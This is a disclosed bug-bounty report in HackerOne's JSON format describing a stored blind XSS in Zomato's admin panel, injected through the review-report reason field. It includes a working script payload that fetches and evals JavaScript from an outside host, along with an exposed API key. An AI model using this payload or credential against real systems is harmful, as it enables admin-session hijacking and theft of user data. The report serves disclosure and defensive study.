{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-03-29T13:41:29.357Z", 
    "voters": [
        "sp1d3rs", 
        "spam404", 
        "europa", 
        "ramsexy", 
        "s_p_q_r", 
        "flashdisk", 
        "nathonsecurity", 
        "akaash_pantherdefence", 
        "muon4", 
        "edoverflow", 
        "and 19 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "350.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 314126, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-03-29T17:45:40.232Z", 
    "vulnerability_information": "#Introduction\nIn the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on https://www.zomato.com\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/reviews_new?review_id={ID}. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using `XMLHttpRequest`.\n\n#Steps to reproduce\n1. Replace the `X-Access-Token` to your access token and the `review_id` to a review you can report.\n2. Send the request in Burp\n3. Go to https://www.zomato.com\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/reviews_new?review_id={ID}\n4. XSS payload executes\n\n```http\nPOST /v2/\u2588\u2588\u2588\u2588\u2588merchant HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 485\nHost: api.zomato.com\nX-Zomato-API-Key: a2cf52f6036511e48be6b2227cce2b54\nX-Access-Token: dc5da\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588ad0fdddff04\nX-Client-Id: zomato_merchantandroid_v2\n\nreason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//ks.xss.ht\");a.send();</script>\n```\n\n#Screenshot Admin Panel\n{\u2588\u2588\u2588\u2588\u2588}\n\n#Dom Snippet\n```html\n <u>Reported by Merchant(ID)</u> : <a style=\"opacity: 1; color: #000000; text-decoration:underline\" href=\"https://www.zomato.com/users/43211589\">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H\nH\nH\nH\nH\n''\"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//ks.xss.ht\");a.send();</script>\n```\n\n## Impact\n\nAn attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://www.zomato.com\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/reviews_new\n\n**Verified**\nYes\n\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "medium", 
        "author_type": "Team"
    }, 
    "title": "Blind XSS - Report review - Admin panel", 
    "is_member_of_team?": null, 
    "vote_count": 29, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "*.zomato.com", 
        "max_severity": "critical", 
        "databaseId": 383, 
        "asset_type": "URL"
    }, 
    "allow_singular_disclosure_at": "2018-04-28T13:41:29.414Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$350", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-02-10T00:49:21.369Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-10T00:49:21.369Z", 
            "actor": {
                "username": "chessmast3r", 
                "url": "/chessmast3r", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/220/459/9c5c4f56adc0246494f1360e16d6a76d409cf2b7_medium.jpg?1511842061"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "zomato", 
            "message": "Hi there @gerben_javado  - thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you.", 
            "markdown_message": "<p>Hi there <a href=\"/gerben_javado\">@gerben_javado</a>  - thanks for sending this in! We are currently reviewing this submission and we&#39;ll notify you once we have more information to share with you.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2369727, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "gerben_javado", 
                "url": "/gerben_javado"
            }, 
            "created_at": "2018-03-09T10:28:21.770Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-09T10:28:21.770Z", 
            "actor": {
                "username": "vinothzomato", 
                "url": "/vinothzomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/059/568/768e852df4ea2bd9087c117fbe7279b8da36b701_medium.jpg?1496138727"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 2476651, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-03-29T06:38:16.434Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-29T06:38:16.434Z", 
            "actor": {
                "url": "/zomato", 
                "profile": {
                    "name": "Zomato"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
                }
            }, 
            "team_handle": "zomato", 
            "bonus_amount": "100.0", 
            "bounty_amount": "250.0", 
            "collaborator": {
                "username": "gerben_javado", 
                "url": "/gerben_javado"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 2542772, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-29T13:41:29.385Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-29T13:41:29.385Z", 
            "actor": {
                "username": "gerben_javado", 
                "url": "/gerben_javado", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/237/b14b89f0786d2684956dc5bbde8fefbf73128ea3_medium.jpg?1536153515"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2544185, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-29T17:43:25.077Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-29T17:43:25.077Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium", 
                "old_severity": "High"
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2544827, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-29T17:45:40.265Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-29T17:45:40.265Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Thanks @gerben_javado for helping us in keeping @zomato secure :)\n\nCheers.", 
            "markdown_message": "<p>Thanks <a href=\"/gerben_javado\">@gerben_javado</a> for helping us in keeping <a href=\"/zomato\">@zomato</a> secure :)</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2544837, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-29T17:45:40.525Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-29T17:45:40.525Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2544838, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "gerben_javado", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/gerben_javado", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/003/237/49c85ba34877c4bf80b90b70358d3f4badcc04f7_small.jpg?1536153515"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 62, 
        "name": "Cross-site Scripting (XSS) - Stored"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -19212269.133410048, 
    "disclosed_at": "2018-03-29T17:45:40.493Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/314126", 
    "created_at": "2018-02-09T08:29:03.069Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"introduction\">Introduction</h1>\n\n<p>In the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on <a title=\"https://www.zomato.xn--com-s74aaaaaaaa/reviews_new?review_id=%7BID%7D\" href=\"/redirect?signature=65104e2b01c25b36b9186514a297111164569449&amp;url=https%3A%2F%2Fwww.zomato.xn--com-s74aaaaaaaa%2Freviews_new%3Freview_id%3D%257BID%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.zomato.xn--com-s74aaaaaaaa/reviews_new?review_id=%7BID%7D</span><i class=\"icon-external-link\"></i></a>. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using <code>XMLHttpRequest</code>.</p>\n\n<h1 id=\"steps-to-reproduce\">Steps to reproduce</h1>\n\n<ol>\n<li>Replace the <code>X-Access-Token</code> to your access token and the <code>review_id</code> to a review you can report.</li>\n<li>Send the request in Burp</li>\n<li>Go to <a title=\"https://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new?review_id=%7BID%7D\" href=\"/redirect?signature=30bf21915b3da6413dedc64a952c1316cd9c05db&amp;url=https%3A%2F%2Fwww.zomato.xn--com-s74aaaaaaaaaa%2Freviews_new%3Freview_id%3D%257BID%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new?review_id=%7BID%7D</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>XSS payload executes</li>\n</ol>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/v2/\u2588\u2588\u2588\u2588\u2588merchant</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">application/x-www-form-urlencoded</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">485</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">api.zomato.com</span>\n<span class=\"na\">X-Zomato-API-Key</span><span class=\"p\">:</span> <span class=\"s\">a2cf52f6036511e48be6b2227cce2b54</span>\n<span class=\"na\">X-Access-Token</span><span class=\"p\">:</span> <span class=\"s\">dc5da\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588ad0fdddff04</span>\n<span class=\"na\">X-Client-Id</span><span class=\"p\">:</span> <span class=\"s\">zomato_merchantandroid_v2</span>\n\nreason_id=5&amp;review_id=32288944&amp;additional_text=&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//ks.xss.ht&quot;);a.send();&lt;/script&gt;\n</code></pre>\n<h1 id=\"screenshot-admin-panel\">Screenshot Admin Panel</h1>\n\n<p>{\u2588\u2588\u2588\u2588\u2588}</p>\n\n<h1 id=\"dom-snippet\">Dom Snippet</h1>\n<pre class=\"highlight html\"><code> <span class=\"nt\">&lt;u&gt;</span>Reported by Merchant(ID)<span class=\"nt\">&lt;/u&gt;</span> : <span class=\"nt\">&lt;a</span> <span class=\"na\">style=</span><span class=\"s\">&quot;opacity: 1; color: #000000; text-decoration:underline&quot;</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://www.zomato.com/users/43211589&quot;</span><span class=\"nt\">&gt;</span>43211589<span class=\"nt\">&lt;/a&gt;&lt;br&gt;&lt;u&gt;</span>Report Reason ID<span class=\"nt\">&lt;/u&gt;</span> : 5 (Other (mention reason below).)<span class=\"nt\">&lt;br&gt;&lt;u&gt;</span>Additional Text<span class=\"nt\">&lt;/u&gt;</span> : H\nH\nH\nH\nH\n&#39;&#39;&quot;<span class=\"ni\">&amp;gt;</span><span class=\"nt\">&lt;script&gt;</span><span class=\"kd\">function</span> <span class=\"nx\">b</span><span class=\"p\">(){</span><span class=\"nb\">eval</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">responseText</span><span class=\"p\">)};</span><span class=\"nx\">a</span><span class=\"o\">=</span><span class=\"k\">new</span> <span class=\"nx\">XMLHttpRequest</span><span class=\"p\">();</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"s2\">&quot;load&quot;</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">);</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s2\">&quot;GET&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;//ks.xss.ht&quot;</span><span class=\"p\">);</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">();</span><span class=\"nt\">&lt;/script&gt;</span>\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.</p>\n\n<p>The hacker selected the <strong>Cross-site Scripting (XSS) - Stored</strong> weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:</p>\n\n<p><strong>URL</strong><br>\n<a title=\"https://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new\" href=\"/redirect?signature=675bb2070d57c4996e6b4b6877ce8d4512a6876d&amp;url=https%3A%2F%2Fwww.zomato.xn--com-s74aaaaaaaaaa%2Freviews_new\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new</span><i class=\"icon-external-link\"></i></a></p>\n\n<p><strong>Verified</strong><br>\nYes</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.zomato.com", 
            "about": "The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide.", 
            "twitter_handle": "Zomato", 
            "name": "Zomato"
        }, 
        "handle": "zomato", 
        "url": "https://hackerone.com/zomato", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/943/7b54bc7a4a265c47ec0d946a6abf079078b82401_small.png?1526447675", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 2943, 
        "default_currency": "usd"
    }, 
    "is_published": false
}